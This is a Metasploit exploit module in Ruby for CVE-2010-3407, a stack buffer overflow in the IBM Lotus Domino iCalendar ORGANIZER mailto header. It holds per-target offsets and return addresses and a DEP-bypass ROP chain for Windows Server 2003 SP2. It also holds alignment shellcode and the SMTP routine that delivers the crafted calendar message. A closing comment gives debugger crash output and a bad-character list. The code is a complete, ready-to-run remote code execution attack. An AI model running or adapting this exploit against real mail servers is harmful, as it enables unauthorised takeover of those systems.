##
# $Id: domino_icalendar_organizer.rb 12236 2011-04-04 17:43:34Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "IBM Lotus Domino iCalendar MAILTO Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in IBM Lotus Domino iCalendar.  By
				sending a long string of data as the "ORGANIZER;mailto" header, process "nRouter.exe"
				crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to
				gain arbitrary code execution.

				Note: In order to trigger the vulnerable code path, a valid Domino mailbox account
				is needed.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 12236 $",
			'Author'         =>
				[
					'A. Plaskett',  #Initial discovery, poc
					'sinn3r',       #Metasploit
				],
			'References'     =>
				[
					[ 'CVE', '2010-3407' ],
					[ 'OSVDB', '68040' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-177/' ],
					[ 'URL', 'http://labs.mwrinfosecurity.com/advisories/lotus_domino_ical_stack_buffer_overflow/' ],
					[ 'URL', 'http://www-01.ibm.com/support/docview.wss?rs=475&uid=swg21446515' ],
				],
			'Payload'        =>
				{
					'BadChars' => [*(0x00..0x08)].pack("C*") + [*(0x10..0x18)].pack("C*") + [*(0x1a..0x1f)].pack("C*") + "\x2c" + [*(0x80..0xff)].pack("C*"),
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' => {'BufferRegister'=>'ECX'},
					'StackAdjustment' => -3500,
				},
			'DefaultOptions' =>
				{
					'ExitFunction' => "process",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Lotus Domino 8.5 on Windows 2000 SP4',
						{
							'Offset'    => 2374,           #Offset to EIP
							'Ret'       => 0x6030582B,     #JMP ECX
							'MaxBuffer' => 9010,           #Total buffer size
						}
					],
					[
						'Lotus Domino 8.5 on Windows Server 2003 SP0',
						{
							'Offset'    => 2374,           #Offset to EIP
							'Ret'       => 0x6030582B,     #JMP ECX (Domino\\nnotes.dll)
							'MaxBuffer' => 9010,           #Total buffer size
						}
					],
					[
						'Lotus Domino 8.5 on Windows Server 2003 SP2',
						{
							'Offset'    => 2374,           #Offset to EIP
							'Ret'       => 0x604C4222,     #ADD AL,0x5E ; RETN
							'EAX'       => 0x7C35287F,     #Initial CALL VirtualProtect addr to align (MSVCR71.dll)
							'EaxOffset' => 2342,           #Offset to EAX
							'RopOffset' => 24,             #Offset to ROP gadgets
							'MaxBuffer' => 9010,           #Total buffer size
						}
					],
				],
			'DisclosureDate' => "Sep 14 2010",
			'DefaultTarget'  => 2))

			register_options(
				[
					Opt::RPORT(25),
					OptString.new('MAILFROM', [true, 'Valid Lotus Domino mailbox account', '']),
					OptString.new('MAILTO',   [true, 'Valid Lotus Domino mailbox account', '']),
				], self.class)
	end

	def check
		connect
		banner = sock.get_once(-1,5).chomp
		disconnect

		if banner =~ /Lotus Domino Release 8.5/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end
	
	def exploit
		sploit = ''
		if target.name =~ /Windows 2000 SP4/

			sploit << rand_text_alpha(934)
			sploit << payload.encoded
			sploit << rand_text_alpha((target['Offset']-sploit.length))
			sploit << [target.ret].pack('V')
			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))

		elsif target.name =~ /Server 2003 SP0/

			sploit << rand_text_alpha(930)
			sploit << payload.encoded
			sploit << rand_text_alpha((target['Offset']-sploit.length))
			sploit << [target.ret].pack('V')
			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))

		elsif target.name =~ /Server 2003 SP2/

			#Borrow a "CALL VirtualProtect()" in Domino's MSVCR71.dll to bypass DEP
			#shellcode max = 1312 bytes
			rop_gadgets =
			[
				#EAX should be aligned to CALL VirtualProtect at this point
				0x604F5728,  #MOV DWORD PTR DS:[ECX],EAX; RETN (nnotes.dll)
				#Set shellcode address
				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)
				0x62454F32,  #ADD AL,2B; RETN (nlsccstr.dll)
				0x603F7B38,  #ADD AL,31; RETN (nnotes.dll)
				0x624B7040,  #MOV DWORD PTR DS:[ECX+4],EAX; RETN (nnotes.dll)
				#Set RETN value
				0x60577B7A,  #XCHG EAX,EDX; RETN (nnotes.dll)
				0x62452E35,  #MOV EAX,ECX; RETN (nlsccstr.dll)
				0x60606F4E,  #ADD AL,5D; RETN (nlsccstr.dll)
				0x603E6260,  #DEC EAX; RETN (nnotes.dll)
				0x603E6260,  #DEC EAX; RETN (nnotes.dll)
				0x603E6260,  #DEC EAX; RETN (nnotes.dll)
				0x603E6260,  #DEC EAX; RETN (nnotes.dll)
				0x603E6260,  #DEC EAX; RETN (nnotes.dll)
				0x7C3A4C72,  #MOV DWORD PTR DS:[EAX],EDX; RETN (msvcp71.dll)
				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)
				0x60253B6D,  #XCHG EAX,EBP; RETN (nnotes.dll)
				#Set Size (0x413)
				0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll)
				0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll)
				0x60592A36,  #ADD EAX,107; RETN (nnotes.dll)
				0x603B4C27,  #ADD AL,2B; RETN (nnotes.dll)
				0x624B7044,  #MOV DWORD PTR DS:[ECX+8],EAX; RETN
				0x604C5225,  #XOR EAX, EAX; RETN
				#newProtect
				0x60386C3C,  #MOV AL,3B; RETN (nnotes.dll)
				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)
				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)
				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)
				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)
				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll)
				0x624B7048,  #MOV DWORD PTR DS:[ECX+C],EAX; RETN
				#oldProtect
				0x602B7353,  #MOV EAX,ESI; POP ESI; RETN (nnotes.dll)
				0x41414141,  #ESI
				0x624B704C,  #MOV DWORD PTR DS:[ECX+10],EAX; RETN (nlsccstr.dll)
				#Call VirtualProtect
				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll)
				0x60276256,  #XCHG EAX,ESP; RETN (nnotes.dll)
			].pack("V*")

			align  = "\x51"      #PUSH ECX
			align << "\x58"      #POP EAX
			align << "\x34\x43"  #XOR AL,43
			align << "\x40"      #INC EAX
			align << "\x34\x65"  #XOR AL,65
			align << "\x50"      #PUSH EAX
			align << "\x59"      #POP ECX

			sploit << rand_text_alpha(1022)
			sploit << align
			sploit << payload.encoded
			sploit << rand_text_alpha((target['EaxOffset']-sploit.length))
			sploit << [target['EAX']].pack('V')
			sploit << rand_text_alpha((target['Offset']-sploit.length))
			sploit << [target.ret].pack('V')
			sploit << rand_text_alpha((target['RopOffset']))
			sploit << rop_gadgets
			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))

		end

		fname   = rand_text_alpha(4)
		prod_id = rand_text_alpha_upper(5) + "@" + rand_text_alpha_upper(13) + "@" + rand_text_alpha_upper(24)
		uid     = rand_text_alpha_upper(15)
		summary = rand_text_alpha_upper(5) + "@" + rand_text_alpha_upper(11)
		status  = rand_text_alpha_upper(4)

		body  = "Content-Type: text/calendar; method=COUNTER; charset=UTF-8\r\n"
		body << "#{fname}.txt\r\n"
		body << "MIME-Version: 1.0\r\n"
		body << "Content-Transfer-Encoding: 8bit\r\n"
		body << "BEGIN:VCALENDAR\r\n"
		body << "METHOD:COUNTER\r\n"
		body << "PRODID:-//#{prod_id}//\r\n"
		body << "VERSION:2.0\r\n"
		body << "BEGIN:VEVENT\r\n"
		body << "UID:#{uid}\r\n"
		body << "SEQ:2\r\n"
		body << "RRULE:aaaa\r\n"
		body << "ORGANIZER:mailto:H@#{sploit}.com\r\n"
		body << "ATTENDEE;:Mailto:#{datastore['MAILTO']}\r\n"
		body << "SUMMARY:#{summary}\r\n"
		body << "DTSTART:20091130T093000Z\r\n"
		body << "DTEND:20091130T093000Z\r\n"
		body << "DTSTAMP:20091130T083147Z\r\n"
		body << "LOCATION:Location\r\n"
		body << "STATUS:#{status}\r\n"
		body << "END:VEVENT\r\n"
		body << "END:VCALENDAR\r\n"
		body << "\r\n.\r\n"

		commands =
		{
			:HELO => "HELO localhost\r\n",
			:FROM => "MAIL FROM: <#{datastore['MAILFROM']}>\r\n",
			:RCPT => "RCPT TO: <#{datastore['MAILTO']}>\r\n",
			:DATA => "DATA\r\n",
			:MESG => body,
			:QUIT => "QUIT\r\n",
		}

		print_status("Trying target #{target.name}")

		connect

		# Get SMTP Banner
		res = sock.get_once.chomp
		print_status("Banner: #{res}")

		# Check banner before trying the exploit
		if res !~ /Lotus Domino Release 8.5/
			print_error("Remote service does not seem to be Lotus Domino 8.5")
			disconnect
			return
		end

		# Send HELO
		sock.put(commands[:HELO])
		res = sock.get_once
		print_status("Received: #{res.chomp}")

		# Set MAIL FROM
		sock.put(commands[:FROM])
		res = sock.get_once
		print_status("Received: #{res.chomp}")

		# Set RCPT
		sock.put(commands[:RCPT])
		res = sock.get_once
		print_status("Received: #{res.chomp}")

		# Set DATA
		sock.put(commands[:DATA])
		res = sock.get_once
		print_status("Received: #{res.chomp}")

		# Send malicious data
		sock.put(commands[:MESG])
		res = sock.get_once

		# QUIT
		sock.put(commands[:QUIT])
		res = sock.get_once
		print_status("Received: #{res.chomp}")

		handler
		disconnect
	end
end


=begin
0:008> r
eax=41414141 ebx=00000004 ecx=08da9700 edx=08dab695 esi=06c248bc edi=00000014
eip=42424242 esp=08da9cc0 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206
42424242 ??              ???
0:008> !exchain
08daea2c: nRouter+511bb (004511bb)
08daffdc: kernel32!_except_handler3+0 (77e70abc)
  CRT scope  0, filter: kernel32!BaseThreadStart+3a (77e4a92d)
                func:   kernel32!BaseThreadStart+4b (77e4a943)
Invalid exception stack at ffffffff
0:008> k
ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
08da9cbc 43434343 0x42424242
08da9cc0 43434343 0x43434343
...
0:008> bl
 0 e 602738f9     0001 (0001)  0:**** nnotes!MailCheck821Address+0xb09
0:008> u 602738f9
nnotes!MailCheck821Address+0xb09:
602738f9 e80239d9ff      call    nnotes!Cstrcpy (60007200)
602738fe eb02            jmp     nnotes!MailCheck821Address+0xb12 (60273902)
60273900 33ff            xor     edi,edi
60273902 8d8dc0faffff    lea     ecx,[ebp-540h]
60273908 51              push    ecx
60273909 8d95bcf6ffff    lea     edx,[ebp-944h]
6027390f 52              push    edx
60273910 e8eb38d9ff      call    nnotes!Cstrcpy (60007200)

Badchars:
0x01=0x0F21, 0x02=0x0f22,  0x03=0x0f23, 0x04=0x0f24, 0x05=0x0f25,  0x06=0x0f26, 0x07=0x0f27
0x08=0x0f28, 0x0a=nocrash, 0x0b=0x0f2b, 0x0c=0x0f2c, 0x0d=nocrash, 0x0e=0x0f2e  0x0f=0x0f2f,
0x10=0x0f30, 0x11=0x0f31,  0x12=0x0f32, 0x13=0x0f33, 0x14=0x0f34,  0x15=0x0f35, 0x16=0x0f36,
0x17=0x0f37, 0x18=0x0f38,  0x1a=0x0f3a, 0x1b=0x0f3b, 0x1c=0x0f3c,  0x1d=0x0f3d, 0x1e=0x0f3e,
0x1f=0x0f3f, 0x2c=nocrash, 0x80..0xff = ""
=end
